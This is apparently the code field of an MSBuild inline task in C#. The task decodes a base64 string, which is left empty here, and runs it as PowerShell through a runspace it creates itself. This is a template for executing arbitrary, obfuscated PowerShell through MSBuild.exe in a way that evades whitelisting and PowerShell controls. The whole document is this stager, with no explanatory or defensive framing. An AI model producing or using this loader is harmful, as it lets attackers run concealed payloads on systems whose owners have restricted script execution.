Task.Code: using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample : Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}}
